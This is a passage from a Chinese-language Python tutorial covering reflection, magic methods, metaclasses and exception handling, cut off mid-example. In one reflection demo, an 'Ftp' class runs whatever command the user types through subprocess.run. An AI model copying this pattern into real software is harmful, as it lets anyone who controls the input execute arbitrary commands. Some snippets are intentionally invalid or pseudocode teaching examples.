print(l1[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>:<span class="hljs-number">2</span>]) <span class="hljs-comment"># l1[s]</span>
print(l2[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>:<span class="hljs-number">2</span>]) <span class="hljs-comment"># l2[s]</span>

<span class="hljs-comment">#    zip</span>
v1=<span class="hljs-string">&apos;hello&apos;</span>
v2=[<span class="hljs-number">111</span>,<span class="hljs-number">222</span>,<span class="hljs-number">333</span>,<span class="hljs-number">444</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">6666</span>]
res=zip(v1,v2)
print(list(res))

<span class="hljs-comment">#    __import__(&apos;time&apos;)&#x5B57;&#x7B26;&#x4E32;&#x6A21;&#x5757;&#x5BFC;&#x5165;</span>
<span class="hljs-comment"># import &apos;time&apos; # &#x9519;&#x8BEF;</span>
time=__import__(<span class="hljs-string">&apos;time&apos;</span>)
time.sleep(<span class="hljs-number">3</span>)
</code></pre>
<h5 id="&#x53CD;&#x5C04;&#x673A;&#x5236;">&#x53CD;&#x5C04;&#x673A;&#x5236;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># &#x4EC0;&#x4E48;&#x662F;&#x53CD;&#x5C04;&#xFF1F;</span>
<span class="hljs-comment"># &#x6307;&#x7684;&#x662F;&#x5728;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x53EF;&#x4EE5;&quot;&#x52A8;&#x6001;&#xFF08;&#x4E0D;&#x89C1;&#x68FA;&#x6750;&#x4E0D;&#x6389;&#x6CEA;&#xFF09;&quot;&#x83B7;&#x53D6;&#x5BF9;&#x8C61;&#x7684;&#x4FE1;&#x606F;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age)</span>:</span>
        self.name=name
        self.age=age

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;&lt;%s:%s&gt;&apos;</span> %(self.name,self.age))

obj=People(<span class="hljs-string">&apos;&#x8FA3;&#x767D;&#x83DC;&#x540C;&#x5B66;&apos;</span>,<span class="hljs-number">18</span>)

<span class="hljs-comment"># &#x5B9E;&#x73B0;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x7684;&#x6B65;&#x9AA4;</span>
<span class="hljs-comment"># 1&#x3001;&#x5148;&#x901A;&#x8FC7;&#x591A;dir&#xFF1A;&#x67E5;&#x770B;&#x51FA;&#x67D0;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x4E0B;&#x53EF;&#x4EE5;.&#x51FA;&#x54EA;&#x4E9B;&#x5C5E;&#x6027;&#x6765;</span>
<span class="hljs-comment"># print(dir(obj))</span>

<span class="hljs-comment"># 2&#x3001;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B57;&#x7B26;&#x4E32;&#x53CD;&#x5C04;&#x5230;&#x771F;&#x6B63;&#x7684;&#x5C5E;&#x6027;&#x4E0A;&#xFF0C;&#x5F97;&#x5230;&#x5C5E;&#x6027;&#x503C;</span>
<span class="hljs-comment"># print(obj.__dict__[dir(obj)[-2]])</span>

<span class="hljs-comment"># 1&#x3001;hasattr()</span>
print(hasattr(obj,<span class="hljs-string">&apos;name&apos;</span>))
print(hasattr(obj,<span class="hljs-string">&apos;x&apos;</span>))

<span class="hljs-comment"># 2&#x3001;getattr()</span>
print(getattr(obj,<span class="hljs-string">&apos;name&apos;</span>))

<span class="hljs-comment"># 3&#x3001;setattr()</span>
setattr(obj,<span class="hljs-string">&apos;name&apos;</span>,<span class="hljs-string">&apos;EGON&apos;</span>) <span class="hljs-comment"># obj.name=&apos;EGON&apos;</span>
print(obj.name)

<span class="hljs-comment"># 4&#x3001;delattr()</span>
delattr(obj,<span class="hljs-string">&apos;name&apos;</span>) <span class="hljs-comment"># del obj.name</span>
print(obj.__dict__)
</code></pre>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> subprocess

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ftp</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">put</span><span class="hljs-params">(self, shell)</span>:</span>
        print(<span class="hljs-string">&apos;&#x6B63;&#x5728;&#x6267;&#x884C;&#x4E0A;&#x4F20;&#x529F;&#x80FD;&apos;</span>)
        subprocess.run(shell.split(), check=<span class="hljs-keyword">True</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self, shell)</span>:</span>
        print(<span class="hljs-string">&apos;&#x6B63;&#x5728;&#x6267;&#x884C;&#x4E0B;&#x8F7D;&#x529F;&#x80FD;&apos;</span>)
        self.put(shell)  <span class="hljs-comment"># &#x8C03;&#x7528;put&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x5C06;shell&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x9012;</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interactive</span><span class="hljs-params">(self)</span>:</span>
        input_str = input(<span class="hljs-string">&quot;&gt;&gt;&gt;: &quot;</span>).strip()
        input_list = input_str.split()
        method = input_list[<span class="hljs-number">0</span>]
        shell = <span class="hljs-string">&apos; &apos;</span>.join(input_list[<span class="hljs-number">1</span>:])  <span class="hljs-comment"># &#x5C06;&#x9664;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x5916;&#x7684;&#x5176;&#x5B83;&#x5143;&#x7D20;&#x62FC;&#x63A5;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;</span>

        <span class="hljs-keyword">if</span> hasattr(self, method):
            getattr(self, method)(shell)
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&apos;&#x8F93;&#x5165;&#x7684;&#x6307;&#x4EE4;&#x4E0D;&#x5B58;&#x5728;&apos;</span>)


obj = Ftp()
obj.interactive()
</code></pre>
<h5 id="&#x5185;&#x7F6E;&#x65B9;&#x6CD5;">&#x5185;&#x7F6E;&#x65B9;&#x6CD5;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># 1&#x3001;&#x4EC0;&#x4E48;&#x662F;&#x5185;&#x7F6E;&#x65B9;&#x6CD5;&#xFF1F;</span>
<span class="hljs-comment"># &#x5B9A;&#x4E49;&#x5728;&#x7C7B;&#x5185;&#x90E8;&#xFF0C;&#x4EE5;__&#x5F00;&#x5934;&#x5E76;&#x4EE5;__&#x7ED3;&#x679C;&#x7684;&#x65B9;&#x6CD5;</span>
<span class="hljs-comment"># &#x7279;&#x70B9;&#xFF1A;&#x4F1A;&#x5728;&#x67D0;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x81EA;&#x52A8;&#x89E6;&#x53D1;&#x6267;&#x884C;</span>

<span class="hljs-comment"># 2&#x3001;&#x4E3A;&#x4F55;&#x8981;&#x7528;&#x5185;&#x7F6E;&#x65B9;&#x6CD5;&#xFF1F;</span>
<span class="hljs-comment"># &#x4E3A;&#x4E86;&#x5B9A;&#x5236;&#x5316;&#x6211;&#x4EEC;&#x7684;&#x7C7B;or&#x5BF9;&#x8C61;</span>

<span class="hljs-comment"># 3&#x3001;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x5185;&#x7F6E;&#x65B9;&#x6CD5;</span>
<span class="hljs-comment"># __str__:&#x5728;&#x6253;&#x5370;&#x5BF9;&#x8C61;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x89E6;&#x53D1;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8FD4;&#x56DE;&#x503C;&#xFF08;&#x5FC5;&#x987B;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF09;&#x5F53;&#x505A;&#x672C;&#x6B21;&#x6253;&#x5370;&#x7684;&#x7ED3;&#x679C;&#x8F93;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, name, age)</span>:</span>
        self.name = name
        self.age = age

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-comment"># print(&apos;&#x8FD0;&#x884C;&#x4E86;...&apos;)</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;%s:%s&gt;&quot;</span> %(self.name,self.age)


obj = People(<span class="hljs-string">&apos;&#x8FA3;&#x767D;&#x83DC;&#x540C;&#x5B66;&apos;</span>, <span class="hljs-number">18</span>)

<span class="hljs-comment"># print(obj.__str__())</span>
print(obj)  <span class="hljs-comment"># &lt;&apos;&#x8FA3;&#x767D;&#x83DC;&#x540C;&#x5B66;&apos;:18&gt;</span>

obj1=int(<span class="hljs-number">10</span>)
print(obj1)

<span class="hljs-comment"># __del__&#xFF1A;&#x5728;&#x6E05;&#x7406;&#x5BF9;&#x8C61;&#x65F6;&#x89E6;&#x53D1;&#xFF0C;&#x4F1A;&#x5148;&#x6267;&#x884C;&#x8BE5;&#x65B9;&#x6CD5;</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, name, age)</span>:</span>
        self.name = name
        self.age = age
        self.x = open(<span class="hljs-string">&apos;a.txt&apos;</span>,mode=<span class="hljs-string">&apos;w&apos;</span>)
        <span class="hljs-comment"># self.x = &#x5360;&#x636E;&#x7684;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__del__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-comment"># print(&apos;run...&apos;)</span>
        <span class="hljs-comment"># &#x53D1;&#x8D77;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;&#x544A;&#x8BC9;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x56DE;&#x6536;&#x76F8;&#x5173;&#x7684;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;</span>
        self.x.close()

obj = People(<span class="hljs-string">&apos;&#x8FA3;&#x767D;&#x83DC;&#x540C;&#x5B66;&apos;</span>, <span class="hljs-number">18</span>)
<span class="hljs-comment"># del obj # obj.__del__()</span>
print(<span class="hljs-string">&apos;============&gt;&apos;</span>)
</code></pre>
<h5 id="&#x5143;&#x7C7B;">&#x5143;&#x7C7B;</h5>
<p>&#x4E00;&#x5207;&#x7686;&#x4E3A;&#x5BF9;&#x8C61;</p>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5143;&#x7C7B;&#x5C31;&#x662F;&#x7528;&#x6765;&#x5B9E;&#x4F8B;&#x5316;&#x4EA7;&#x751F;&#x7C7B;&#x7684;&#x7C7B;&#xFF0C;&#x628A;People&#x770B;&#x6210;&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x7684;&#x7C7B;&#x5C31;&#x662F;Class</span>
<span class="hljs-comment"># &#x5173;&#x7CFB;&#xFF1A;&#x5143;&#x7C7B;---&#x5B9E;&#x4F8B;&#x5316;----&gt;&#x7C7B;&#xFF08;People&#xFF09;---&#x5B9E;&#x4F8B;&#x5316;----&gt;&#x5BF9;&#x8C61;&#xFF08;obj&#xFF09;</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age)</span>:</span>
        self.name=name
        self.age=age

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;%s:%s&apos;</span> %(self.name,self.name))

obj = People(<span class="hljs-string">&apos;batmanfuture&apos;</span>,<span class="hljs-string">&apos;123456&apos;</span>)
print(type(obj))
print(type(People))
</code></pre>
<h5 id="class&#x673A;&#x5236;&#x5206;&#x6790;">class&#x673A;&#x5236;&#x5206;&#x6790;</h5>
<pre><code class="lang-python">&#x7C7B;&#x6709;&#x4E09;&#x5927;&#x7279;&#x5F81;&#xFF1A;
<span class="hljs-comment"># 1&#x3001;&#x7C7B;&#x540D;</span>
class_name=<span class="hljs-string">&quot;People&quot;</span>
<span class="hljs-comment"># 2&#x3001;&#x7C7B;&#x7684;&#x57FA;&#x7C7B;</span>
class_bases=(object,)
<span class="hljs-comment"># 3&#x3001;&#x6267;&#x884C;&#x7C7B;&#x4F53;&#x4EE3;&#x7801;&#x62FF;&#x5230;&#x7C7B;&#x7684;&#x540D;&#x79F0;&#x7A7A;&#x95F4;</span>
class_dic={}
class_body=<span class="hljs-string">&quot;&quot;&quot;
def __init__(self,name,age):
    self.name=name
    self.age=age

def say(self):
    print(&apos;%s:%s&apos; %(self.name,self.name))
&quot;&quot;&quot;</span>
exec(class_body,{},class_dic)
People=type(class_name,class_bases,class_dic)
</code></pre>
<h4 id="&#x5B9A;&#x5236;&#x5143;&#x7C7B;&#x63A7;&#x5236;&#x7C7B;&#x7684;&#x4EA7;&#x751F;">&#x5B9A;&#x5236;&#x5143;&#x7C7B;&#x63A7;&#x5236;&#x7C7B;&#x7684;&#x4EA7;&#x751F;</h4>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mymeta</span><span class="hljs-params">(type)</span>:</span> <span class="hljs-comment"># &#x53EA;&#x6709;&#x7EE7;&#x627F;&#x4E86;type&#x7C7B;&#x7684;&#x7C7B;&#x624D;&#x662F;&#x5143;&#x7C7B;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span>
        <span class="hljs-comment"># 1&#x3001;Mymeta.__call__&#x51FD;&#x6570;&#x5185;&#x4F1A;&#x5148;&#x8C03;&#x7528;People&#x5185;&#x7684;__new__</span>
        people_obj=self.__new__(self)
        <span class="hljs-comment"># 2&#x3001;Mymeta.__call__&#x51FD;&#x6570;&#x5185;&#x4F1A;&#x8C03;&#x7528;People&#x5185;&#x7684;__init__</span>
        self.__init__(people_obj,*args, **kwargs)

        <span class="hljs-comment"># print(&apos;people&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#xFF1A;&apos;,people_obj.__dict__)</span>
        people_obj.__dict__[<span class="hljs-string">&apos;xxxxx&apos;</span>]=<span class="hljs-number">11111</span>
        <span class="hljs-comment"># 3&#x3001;Mymeta.__call__&#x51FD;&#x6570;&#x5185;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x521D;&#x59CB;&#x5316;&#x597D;&#x7684;&#x5BF9;&#x8C61;</span>
        <span class="hljs-keyword">return</span> people_obj

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span><span class="hljs-params">(metaclass=Mymeta)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age)</span>:</span>
        self.name=name
        self.age=age

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say</span><span class="hljs-params">(self)</span>:</span>
        print(<span class="hljs-string">&apos;%s:%s&apos;</span> %(self.name,self.name))

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__new__</span><span class="hljs-params">(cls, *args, **kwargs)</span>:</span>
        <span class="hljs-comment"># &#x4EA7;&#x751F;&#x771F;&#x6B63;&#x7684;&#x5BF9;&#x8C61;</span>
        <span class="hljs-keyword">return</span> object.__new__(cls)

obj1=People(<span class="hljs-string">&apos;egon&apos;</span>, <span class="hljs-number">18</span>)
obj2=People(<span class="hljs-string">&apos;egon&apos;</span>, <span class="hljs-number">18</span>)
<span class="hljs-comment"># print(obj)</span>
print(obj1.__dict__)
print(obj2.__dict__)
</code></pre>
<p><strong>call</strong>&#x65B9;&#x6CD5;</p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CLanguage</span>:</span>
    <span class="hljs-comment"># &#x5B9A;&#x4E49;__call__&#x65B9;&#x6CD5;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span><span class="hljs-params">(self,name,add)</span>:</span>
        print(<span class="hljs-string">&quot;&#x8C03;&#x7528;__call__()&#x65B9;&#x6CD5;&quot;</span>,name,add)

clangs = CLanguage()
clangs(<span class="hljs-string">&quot;C&#x8BED;&#x8A00;&#x4E2D;&#x6587;&#x7F51;&quot;</span>,<span class="hljs-string">&quot;http://c.biancheng.net&quot;</span>)
</code></pre>
<p>new&#x65B9;&#x6CD5;</p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demoClass</span>:</span>
    instances_created = <span class="hljs-number">0</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__new__</span><span class="hljs-params">(cls,*args,**kwargs)</span>:</span>
        print(<span class="hljs-string">&quot;__new__():&quot;</span>,cls,args,kwargs)
        instance = super().__new__(cls)
        instance.number = cls.instances_created
        cls.instances_created += <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> instance
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,attribute)</span>:</span>
        print(<span class="hljs-string">&quot;__init__():&quot;</span>,self,attribute)
        self.attribute = attribute

test1 = demoClass(<span class="hljs-string">&quot;abc&quot;</span>)
test2 = demoClass(<span class="hljs-string">&quot;xyz&quot;</span>)

print(test1.number, test1.instances_created)
print(test2.number, test2.instances_created)
</code></pre>
<h5 id="&#x5F02;&#x5E38;&#x5904;&#x7406;">&#x5F02;&#x5E38;&#x5904;&#x7406;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># 1&#x3001;&#x4EC0;&#x4E48;&#x662F;&#x5F02;&#x5E38;</span>
<span class="hljs-comment"># &#x5F02;&#x5E38;&#x662F;&#x7A0B;&#x5E8F;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x7684;&#x4FE1;&#x53F7;&#xFF0C;&#x7A0B;&#x5E8F;&#x4E00;&#x65E6;&#x51FA;&#x9519;&#x5C31;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#xFF0C;&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;&#x968F;&#x5373;&#x7EC8;&#x6B62;</span>

<span class="hljs-comment"># 1.1 &#x5F02;&#x5E38;&#x5904;&#x7406;&#x7684;&#x4E09;&#x4E2A;&#x7279;&#x5F81;</span>
<span class="hljs-comment"># &#x5F02;&#x5E38;&#x7684;&#x8FFD;&#x8E2A;&#x4FE1;&#x606F;</span>
<span class="hljs-comment"># &#x5F02;&#x5E38;&#x7684;&#x7C7B;&#x578B;</span>
<span class="hljs-comment"># &#x5F02;&#x5E38;&#x7684;&#x5185;&#x5BB9;</span>

<span class="hljs-comment"># 2&#x3001;&#x4E3A;&#x4F55;&#x5904;&#x7406;&#x5F02;&#x5E38;</span>
<span class="hljs-comment"># &#x4E3A;&#x4E86;&#x589E;&#x5F3A;&#x7A0B;&#x5E8F;&#x7684;&#x5065;&#x58EE;&#x6027;&#xFF0C;&#x5373;&#x4FBF;&#x662F;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x51FA;&#x9519;&#x4E86;&#xFF0C;&#x4E5F;&#x4E0D;&#x8981;&#x7EC8;&#x6B62;&#x7A0B;&#x5E8F;</span>
<span class="hljs-comment"># &#x800C;&#x662F;&#x6355;&#x6349;&#x5F02;&#x5E38;&#x5E76;&#x5904;&#x7406;&#xFF1A;&#x5C06;&#x51FA;&#x9519;&#x4FE1;&#x606F;&#x8BB0;&#x5F55;&#x5230;&#x65E5;&#x5FD7;&#x5185;</span>

<span class="hljs-comment"># 3&#x3001;&#x5982;&#x4F55;&#x5904;&#x7406;&#x5F02;&#x5E38;&#xFF1F;</span>
<span class="hljs-comment"># 3.1 &#x8BED;&#x6CD5;&#x4E0A;&#x7684;&#x9519;&#x8BEF;SyntaxError,</span>
<span class="hljs-comment"># &#x5904;&#x7406;&#x65B9;&#x5F0F;&#x4E00;&#xFF1A;&#x5FC5;&#x987B;&#x5728;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x524D;&#x5C31;&#x6539;&#x6B63;</span>
<span class="hljs-keyword">if</span> <span class="hljs-number">1</span>&gt;<span class="hljs-number">3</span>
    print(<span class="hljs-string">&quot;run...&quot;</span>)

<span class="hljs-comment"># 3.2 &#x903B;&#x8F91;&#x4E0A;&#x7684;&#x9519;&#x8BEF;</span>
<span class="hljs-comment"># 3.2.1 &#x9519;&#x8BEF;&#x53D1;&#x751F;&#x7684;&#x6761;&#x4EF6;&#x662F;&#x53EF;&#x4EE5;&#x9884;&#x77E5;&#x7684;&#xFF0C;&#x4F7F;&#x7528;if&#x5224;&#x65AD;&#x6765;&#x89E3;&#x51B3;</span>


<span class="hljs-comment"># 3.2.2 &#x9519;&#x8BEF;&#x53D1;&#x751F;&#x7684;&#x6761;&#x4EF6;&#x662F;&#x65E0;&#x6CD5;&#x9884;&#x77E5;&#x7684;</span>

print(<span class="hljs-string">&apos;start...&apos;</span>)
<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># &#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x7684;&#x4EE3;&#x7801;</span>
    &#x5B50;&#x4EE3;&#x7801;<span class="hljs-number">1</span>
    &#x5B50;&#x4EE3;&#x7801;<span class="hljs-number">2</span>
    &#x5B50;&#x4EE3;&#x7801;<span class="hljs-number">3</span>
<span class="hljs-keyword">except</span> &#x5F02;&#x5E38;&#x7C7B;&#x578B;<span class="hljs-number">1</span> <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">pass</span>
<span class="hljs-keyword">except</span> &#x5F02;&#x5E38;&#x7C7B;&#x578B;<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">pass</span>
...
<span class="hljs-keyword">else</span>:
    &#x5982;&#x679C;&#x88AB;&#x68C0;&#x6D4B;&#x7684;&#x5B50;&#x4EE3;&#x7801;&#x5757;&#x6CA1;&#x6709;&#x5F02;&#x5E38;&#x53D1;&#x751F;&#xFF0C;&#x5219;&#x4F1A;&#x6267;&#x884C;<span class="hljs-keyword">else</span>&#x7684;&#x5B50;&#x4EE3;&#x7801;
<span class="hljs-keyword">finally</span>:
    &#x65E0;&#x8BBA;&#x88AB;&#x68C0;&#x6D4B;&#x7684;&#x5B50;&#x4EE3;&#x7801;&#x5757;&#x6709;&#x65E0;&#x5F02;&#x5E38;&#x53D1;&#x751F;&#xFF0C;&#x90FD;&#x4F1A;&#x6267;&#x884C;<span class="hljs-keyword">finally</span>&#x7684;&#x5B50;&#x4EE3;&#x7801;

print(<span class="hljs-string">&apos;end...&apos;</span>)

<span class="hljs-comment"># &#x7528;&#x6CD5;&#x4E00;&#xFF1A;</span>
print(<span class="hljs-string">&apos;start...&apos;</span>)

<span class="hljs-keyword">try</span>:
    print(<span class="hljs-string">&apos;1111111111&apos;</span>)
    l=[<span class="hljs-string">&apos;aaa&apos;</span>,<span class="hljs-string">&apos;bbbb&apos;</span>]
    l[<span class="hljs-number">3</span>] <span class="hljs-comment"># &#x629B;&#x51FA;&#x5F02;&#x5E38;IndexError,&#x8BE5;&#x884C;&#x4EE3;&#x7801;&#x540C;&#x7EA7;&#x522B;&#x7684;&#x540E;&#x7EED;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x8FD0;&#x884C;</span>
    print(<span class="hljs-string">&apos;2222222222&apos;</span>)
    xxx
    print(<span class="hljs-string">&apos;33333333&apos;</span>)
    dic={<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-number">1</span>}
    dic[<span class="hljs-string">&apos;a&apos;</span>]
<span class="hljs-keyword">except</span> IndexError <span class="hljs-keyword">as</span> e:
    print(<span class="hljs-string">&apos;&#x5F02;&#x5E38;&#x7684;&#x4FE1;&#x606F;: &apos;</span>,e)

print(<span class="hljs-string">&apos;end....&apos;</span>)

<span class="hljs-comment"># &#x7528;&#x6CD5;&#x4E8C;&#xFF1A;</span>
print(<span class="hljs-string">&apos;start...&apos;</span>)

<span class="hljs-keyword">try</span>:
    print(<span class="hljs-string">&apos;1111111111&apos;</span>)
    l=[<span class="hljs-string">&apos;aaa&apos;</span>,<span class="hljs-string">&apos;bbbb&apos;</span>]
    <span class="hljs-comment"># l[3] # &#x629B;&#x51FA;&#x5F02;&#x5E38;IndexError,&#x8BE5;&#x884C;&#x4EE3;&#x7801;&#x540C;&#x7EA7;&#x522B;&#x7684;&#x540E;&#x7EED;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x8FD0;&#x884C;</span>
    print(<span class="hljs-string">&apos;2222222222&apos;</span>)
    xxx
    print(<span class="hljs-string">&apos;33333333&apos;</span>)
    dic={<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-number">1</span>}
    dic[<span class="hljs-string">&apos;a&apos;</span>]
<span class="hljs-keyword">except</span> IndexError <span class="hljs-keyword">as</span> e:
    print(<span class="hljs-string">&apos;&#x5F02;&#x5E38;&#x7684;&#x4FE1;&#x606F;: &apos;</span>,e)
<span class="hljs-keyword">except</span> NameError <span class="hljs-keyword">as</span> e:
    print(<span class="hljs-string">&apos;&#x5F02;&#x5E38;&#x7684;&#x4FE1;&#x606F;: &apos;</span>,e)

print(<span class="hljs-string">&apos;end....&apos;</span>)

<span class="hljs-comment"># &#x7528;&#x6CD5;&#x4E09;&#xFF1A;</span>
print(<span class="hljs-string">&apos;start...&apos;</span>)

<span class="hljs-keyword">try</span>:
    print(<span class="hljs-string">&apos;1111111111&apos;</span>)
    l = [<span class="hljs-string">&apos;aaa&apos;</span>, <span class="hljs-string">&apos;bbbb&apos;</span>]
    l[<span class="hljs-number">3</span>] <span class="hljs-comment"># &#x629B;&#x51FA;&#x5F02;&#x5E38;IndexError,&#x8BE5;&#x884C;&#x4EE3;&#x7801;&#x540C;&#x7EA7;&#x522B;&#x7684;&#x540E;&#x7EED;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x8FD0;&#x884C;</span>
    print(<span class="hljs-string">&apos;2222222222&apos;</span>)
    xxx
    print(<span class="hljs-string">&apos;33333333&apos;</span>)
    dic = {<span class="hljs-string">&apos;a&apos;</span>: <span class="hljs-number">1</span>}
    dic[<span class="hljs-string">&apos;aaa&apos;</span>]
<span class="hljs-comment"># except (IndexError, NameError) as e:</span>
<span class="hljs-comment">#     print(&apos;&#x5F02;&#x5E38;&#x7684;&#x4FE1;&#x606F;: &apos;, e)</span>
<span class="hljs-comment"># except KeyError as e:</span>
<span class="hljs-comment">#     print(&apos;&#x5B57;&#x5178;&#x7684;key&#x4E0D;&#x5B58;&#x5728;: &apos;, e)</span>
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># &#x4E07;&#x80FD;&#x5F02;&#x5E38;</span>
    print(<span class="hljs-string">&apos;&#x6240;&#x6709;&#x5F02;&#x5E38;&#x90FD;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x7684;&#x5230;&apos;</span>)
print(<span class="hljs-string">&apos;end....&apos;</span>)

<span class="hljs-comment"># &#x7528;&#x6CD5;&#x56DB;&#xFF1A;else&#x4E0D;&#x80FD;&#x5355;&#x72EC;&#x4E0E;try&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x5FC5;&#x987B;&#x8981;&#x642D;&#x914D;except</span>
print(<span class="hljs-string">&apos;start...&apos;</span>)

<span class="hljs-keyword">try</span>:
    print(<span class="hljs-string">&apos;1111111111&apos;</span>)
    print(<span class="hljs-string">&apos;2222222222&apos;</span>)
    print(<span class="hljs-string">&apos;33333333&apos;</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># &#x4E07;&#x80FD;&#x5F02;&#x5E38;</span>
    print(<span class="hljs-string">&apos;&#x6240;&#x6709;&#x5F02;&#x5E38;&#x90FD;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x7684;&#x5230;&apos;</span>)
<span class="hljs-keyword">else</span>:
    print(<span class="hljs-string">&apos;====&gt;&apos;</span>)

print(<span class="hljs-string">&apos;end....&apos;</span>)

<span class="hljs-comment"># &#x7528;&#x6CD5;&#x4E94;&#xFF1A;finally&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x4E0E;try&#x914D;&#x5408;&#x4F7F;&#x7528;</span>
print(<span class="hljs-string">&apos;start...&apos;</span>)

<span class="hljs-keyword">try</span>:
    print(<span class="hljs-string">&apos;1111111111&apos;</span>)
    l = [<span class="hljs-string">&apos;aaa&apos;</span>, <span class="hljs-string">&apos;bbbb&apos;</span>]
    l[<span class="hljs-number">3</span>] <span class="hljs-comment"># &#x629B;&#x51FA;&#x5F02;&#x5E38;IndexError,&#x8BE5;&#x884C;&#x4EE3;&#x7801;&#x540C;&#x7EA7;&#x522B;&#x7684;&#x540E;&#x7EED;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x8FD0;&#x884C;</span>
    print(<span class="hljs-string">&apos;2222222222&apos;</span>)
    xxx
